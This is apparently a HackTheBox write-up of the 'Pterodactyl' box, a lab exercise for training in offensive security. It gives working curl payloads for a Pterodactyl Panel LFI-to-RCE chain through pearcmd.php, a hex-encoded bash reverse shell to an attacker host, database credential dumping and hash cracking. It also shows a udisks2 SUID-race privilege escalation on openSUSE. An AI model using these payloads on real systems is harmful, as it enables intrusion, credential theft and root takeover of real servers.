---
title: "pterodactyl"
date: 2026-02-26
draft: false
tags: ["linux", "web", "easy/medium"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Linux (OpenSUSE 15, kernel 6.4.0-150600, nginx 1.21.5, PHP 8.4.8)"
    difficulty: "Easy/Medium"
ShowToc: true
protected: true
---

# Pterodactyl — HackTheBox Writeup

Pterodactyl is a Linux box built around a real-world attack chain: an unauthenticated LFI vulnerability in the Pterodactyl Panel game server management software leads to RCE, credential extraction, and ultimately root through a pair of freshly-disclosed SUSE-specific udisks2 privilege escalation CVEs. It's a satisfying box because every step has a meaningful "why" behind it — nothing is arbitrary.

---

## Overview

The box hosts a Minecraft server homepage alongside a Pterodactyl Panel installation. Enumeration surfaces a misconfigured `phpinfo.php` that reveals the exact PHP configuration needed for a PEAR-based RCE chain. After exploiting CVE-2025-49132 (unauthenticated LFI in the panel) to pivot to RCE, we dump database credentials, crack a user's bcrypt hash, and SSH in. From there, a two-CVE chain targeting udisks2 on OpenSUSE — PAM environment injection to trick Polkit, followed by a SUID binary race on a temporary mount — hands us root.

## Attack Chain at a Glance

1. **Web enumeration** — Exposed `phpinfo.php` and `changelog.txt` reveal PHP-PEAR is installed with `register_argc_argv` enabled
2. **LFI to RCE** — CVE-2025-49132 (unauthenticated LFI in Pterodactyl Panel) chains with PEAR's `pearcmd.php` to write a webshell
3. **Credential extraction** — Database credentials from Laravel config → dump MariaDB → crack bcrypt hash → SSH as user
4. **Privilege escalation** — Two OpenSUSE-specific udisks2 CVEs: PAM environment injection to bypass Polkit, then a SUID race condition on a temporary mount for root

**Tools used:** nmap, gobuster, curl, john, MariaDB client

<div id="protected-marker"></div>

---

## Reconnaissance

### Port Scan

Starting with a standard Nmap service scan:

```bash
nmap -sC -sV -oA nmap/pterodactyl <TARGET>
```

Only two ports are open:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
80/tcp open  http    nginx 1.21.5 → redirects to http://pterodactyl.htb/
```

The HTTP redirect tells us to add `pterodactyl.htb` to `/etc/hosts`. Before diving in, I also probed for virtual hosts with some quick `curl` requests using the `Host` header:

```bash
curl -sI -H "Host: panel.pterodactyl.htb" http://<TARGET>/
```

A `200 OK` with a `pterodactyl_session` cookie confirmed `panel.pterodactyl.htb` was alive. A similar check found `play.pterodactyl.htb` redirecting back to the main site — a DNS alias for the Minecraft server address, nothing useful. I added all three to `/etc/hosts`:

```
<TARGET>  pterodactyl.htb panel.pterodactyl.htb play.pterodactyl.htb
```

### Web Enumeration

**`pterodactyl.htb`** serves a "MonitorLand" Minecraft server landing page. Running Gobuster against it turned up two interesting findings beyond `index.php`:

```bash
gobuster dir -u http://pterodactyl.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt
```

- `/phpinfo.php` — phpinfo() left exposed (the changelog even notes it was "temporary PHP debugging")
- `/changelog.txt` — version and configuration disclosures

The `changelog.txt` is a goldmine of information:
- Site name: MonitorLand
- **Pterodactyl Panel v1.11.10** installed at `panel.pterodactyl.htb`
- **MariaDB 11.8.3** backend
- **PHP-PEAR installed** ("for PHP package management")
- phpinfo() left exposed accidentally

**`panel.pterodactyl.htb`** serves the actual Pterodactyl Panel — a Laravel-based game server management application. Version 1.11.10 will be important shortly.

### phpinfo.php — The Real Gold

The exposed `phpinfo.php` on the main vhost reveals several critical PHP configuration values:

| Setting | Value |
|---|---|
| `register_argc_argv` | **On** |
| `include_path` | `.:/usr/share/php8:/usr/share/php/PEAR` |
| `open_basedir` | *(not set — unrestricted)* |
| `disable_functions` | *(not set — unrestricted)* |
| `DOCUMENT_ROOT` | `/var/www/html` |
| `USER` | `wwwrun` |
| PHP version | 8.4.8 |

The combination of `register_argc_argv = On` and PHP-PEAR installed is a well-known RCE primitive. When PHP processes a request, if `register_argc_argv` is enabled, the query string gets parsed into `$argv`. PEAR's `pearcmd.php` uses `$argv` directly — meaning a web request can invoke PEAR commands, including `config-create` which writes arbitrary content to disk. We just need a way to include `pearcmd.php` from a web request, which is exactly what the Pterodactyl LFI provides.

---

## Foothold — CVE-2025-49132 + PEAR RCE

### The Pterodactyl LFI (CVE-2025-49132)

Pterodactyl Panel ≤ 1.11.10 has an unauthenticated local file inclusion vulnerability on the `/locales/locale.json` endpoint. The `locale` and `namespace` parameters are passed directly to Laravel's `FileLoader::loadPath()`, which constructs a file path as `{path}/{locale}/{namespace}.php` and calls `getRequire()` (PHP's `require`). There's no path traversal sanitization and no authentication required.

A key detail that tripped me up reading about this CVE: despite the `.json` in the route name, the file extension actually appended is **`.php`**. The `.json` is just what the route is named. This means we can include any `.php` file on the filesystem, but not arbitrary files.

Let's confirm it works by leaking the database config:

```bash
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
```

The path traversal walks us up from the locale directory to the Laravel root, then loads `config/database.php`. The output leaks MySQL credentials:

```
...pterodactyl:PteraPanel...127.0.0.1:3306...panel...
```

Credentials confirmed: `pterodactyl:PteraPanel`. I also used the LFI to read the `.env` file later via webshell, which yielded the `APP_KEY` and `HASHIDS_SALT` values — not needed for this path, but good to note.

### Building the PEAR RCE Chain

Now we have LFI — we can include any `.php` file on the server. The PEAR library lives at `/usr/share/php/PEAR/pearcmd.php` (confirmed by the `include_path` in phpinfo). `pearcmd.php` reads `$argv` on startup, and because `register_argc_argv` is on, the query string populates `$argv`. The `config-create` PEAR command takes two arguments — a root path and an output filename — and writes a PHP-serialized config file to disk. We can inject a PHP webshell into that output path argument.

The URL format here is specific and took some iteration to get right. The query string does double duty: it must satisfy the Pterodactyl app's `locale` and `namespace` parameters *and* supply PEAR's argv. The `+` character becomes a space in PEAR's argv parsing. The critical thing I got wrong initially was putting all PEAR arguments `+`-separated before the `&locale=` — the `=` signs in the query string broke argv splitting. The working format interleaves PEAR args with `&`-separated app parameters:

```
?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<PAYLOAD>+/tmp/shell.php
```

Breaking this down:
- `+config-create+/` — PEAR argv[1] and argv[2] start
- `&locale=../../../../../../usr/share/php/PEAR` — traversal to PEAR directory
- `&namespace=pearcmd` — includes pearcmd.php
- `&/<PAYLOAD>+/tmp/shell.php` — PEAR argv[3] and argv[4]: the config "root" (with embedded PHP) and output path

For the payload, I hex-encode it with `hex2bin()` to avoid every URL-special character issue at once — no worrying about `+`, `&`, `=`, `<`, `>`, or spaces:

```bash
# Encode the command we want to test first
echo -n 'id' | xxd -p | tr -d '\n'
# 6964
```

**Step 1: Write the webshell to /tmp**

```bash
curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin("6964"))?>+/tmp/shell.php'
```

**Step 2: Include the written file to execute it**

```bash
curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell'
```

The response contains `uid=474(wwwrun) gid=477(www)` buried in some PEAR config XML — blind but confirmed RCE.

### Getting a Reverse Shell

For a proper interactive shell, I hex-encode a bash reverse shell payload:

```bash
echo -n 'bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"' | xxd -p | tr -d '\n'
```

Start the listener, write the payload, trigger it:

```bash
# Write reverse shell
curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin("HEX_HERE"))?>+/tmp/rev.php'

# Catch a shell (nc -nlvp 4444 running in another terminal)
curl -s -g 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=rev'
```

Shell lands as `wwwrun`. The user flag is readable immediately:

```bash
cat /home/phileasfogg3/user.txt
# [redacted]
```

### Database Credential Extraction

With a shell, I query the Pterodactyl panel's database. The `-h 127.0.0.1` flag is required — MariaDB on SUSE rejects socket auth for this user:

```bash
mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1 -D panel -e 'SELECT id,username,email,password FROM users;'
```

Two users are registered in the panel, both with bcrypt hashes. I pull them out and run hashcat:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

`headmonitor`'s hash didn't crack in a reasonable time. `phileasfogg3`'s hash cracks to `!QAZ2wsx` — a keyboard walk pattern (`!QAZ` diagonally down-left on a US keyboard, `2wsx` down-right). Common enough to be in rockyou.

```bash
ssh phileasfogg3@pterodactyl.htb
# Password: !QAZ2wsx
```

### A Dead End with sudo

First thing I check after getting SSH access:

```bash
sudo -l
```

```
(ALL) ALL
```

Looks like full sudo access — but there's a catch. The sudoers configuration includes `targetpw`, which means `sudo` prompts for the *target user's* password (root's password), not my own. Without root's password, `(ALL) ALL` is useless here.

### A Useful Hint in the Mail Spool

While enumerating, I checked the local mail:

```bash
cat /var/spool/mail/phileasfogg3
```

There's an email from `headmonitor` warning about "unusual udisksd activity." This is a direct hint — time to look at udisks2.

---

## Privilege Escalation — CVE-2025-6018 + CVE-2025-6019

### CVE-2025-6018: Tricking Polkit with PAM Environment

Polkit differentiates between "active" sessions (local console) and "inactive" sessions (SSH, etc.). Many udisks2 operations require `allow_active`, which SSH sessions don't have. On SUSE/openSUSE specifically, the PAM stack loads `pam_env.so` — which reads `~/.pam_environment` — *before* `pam_systemd.so`. This means we can inject environment variables that get set before systemd registers the session type.

`XDG_SEAT` and `XDG_VTNR` are the variables that tell Polkit "this is a local console session on seat0, virtual terminal 1." If we set them in `~/.pam_environment` and reconnect via SSH, Polkit sees an active session:

```bash
echo "XDG_SEAT=seat0" > ~/.pam_environment
echo "XDG_VTNR=1" >> ~/.pam_environment
```

Log out and back in via SSH, then verify:

```bash
loginctl show-session $XDG_SESSION_ID | grep Active
# Active=yes
```

We're now considered an active local session by Polkit. This unlocks udisks2 operations that previously required a password prompt.

### CVE-2025-6019: SUID Binary via Unsecured Temporary Mount

When udisks2 runs certain filesystem operations (`Filesystem.Resize`, `Filesystem.Check`) via libblockdev, it temporarily mounts the filesystem under `/tmp/blockdev.XXXXXX` to perform its work. The critical flaw: this mount does not include `nosuid` or `nodev` flags. A SUID binary on the filesystem being operated on will execute with root privileges when triggered during the window the mount is active.

The plan:
1. Build an XFS image containing a SUID bash binary (on our attacker machine where we have root)
2. Transfer it to the target
3. Set up a loop device for the image
4. Background a process that watches for the temporary mount and fires the SUID binary
5. Trigger the resize operation via D-Bus to create the temporary mount window

**Building the malicious XFS image (attacker machine, as root):**

```bash
dd if=/dev/zero of=/tmp/xfs.image bs=1M count=300
mkfs.xfs /tmp/xfs.image
mkdir -p /tmp/xfs.mount
mount -t xfs /tmp/xfs.image /tmp/xfs.mount
cp /usr/bin/bash /tmp/xfs.mount/bash
chmod 04555 /tmp/xfs.mount/bash
umount /tmp/xfs.mount
```

**On the target — transfer and set up:**

```bash
wget http://<VPN_IP>:8080/xfs.image -O /tmp/xfs.image

# Set up loop device (now works without password thanks to CVE-2025-6018)
udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
# Loopback device file is /dev/loop0.
```

**Start the race condition catcher in the background:**

```bash
( while true; do
    for d in /tmp/blockdev.*/bash; do
        if [ -f "$d" ]; then
            "$d" -p -c "id > /tmp/root_proof.txt; cat /root/root.txt >> /tmp/root_proof.txt" 2>/dev/null
        fi
    done
done ) &
```

This loop runs continuously, scanning for our SUID bash appearing in any `/tmp/blockdev.*` directory. The moment the udisks2 temporary mount comes up, it fires.

**Trigger the vulnerable resize via D-Bus:**

```bash
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

**Check the results:**

```bash
cat /tmp/root_proof.txt
# uid=1002(phileasfogg3) gid=100(users) euid=0(root)
# [redacted]
```

The race is tight but winnable — the mount window is short, but a tight busy loop catches it reliably within a few seconds.

---

## Lessons Learned

**LFI path construction matters.** The `.json` in the route URL was actively misleading — Laravel's `FileLoader` appends `.php` and uses `require`. You can't just read any file; you need `.php` files. Understanding framework internals, not just the CVE description, is what makes exploitation reliable.

**pearcmd.php URL format is specific.** PEAR args must be interleaved with `&`-separated app parameters. Putting all args as `+`-separated at the start fails because `=` signs in the query string corrupt argv parsing. This took several failed attempts before the correct structure clicked.

**hex2bin() for payload encoding is the clean solution.** It sidesteps every URL-special character problem in one move — no fighting with `+`, `&`, `=`, `<`, `>`, or spaces. For any pearcmd exploitation involving code execution, encode your payload in hex and decode it in-PHP.

**targetpw sudo is not a free win.** `(ALL) ALL` in sudoers looks like instant root access, but `targetpw` means you need root's password, not your own. Always read the full sudoers output before getting excited.

**Read your mail.** The email about "unusual udisksd activity" directly pointed at the CVE-2025-6018/6019 chain. Mail spools, notes files, and README files in home directories are placed there for a reason on CTF boxes.

**SUSE-specific PAM ordering creates a real attack surface.** The `~/.pam_environment` bypass is SUSE-specific because of how their PAM stack orders `pam_env.so` relative to `pam_systemd.so`. The same technique would fail on Ubuntu or Debian. OS fingerprinting matters — knowing you're on OpenSUSE is what surfaces this vector.

**Unsecured temporary mounts are a meaningful vulnerability class.** The udisks2 flaw is subtle: the mount only exists for a brief window during a resize operation, and there's no obvious indicator it's happening. A busy loop watching for the temporary directory is the correct approach. Tight race conditions like this are winnable with the right polling strategy.
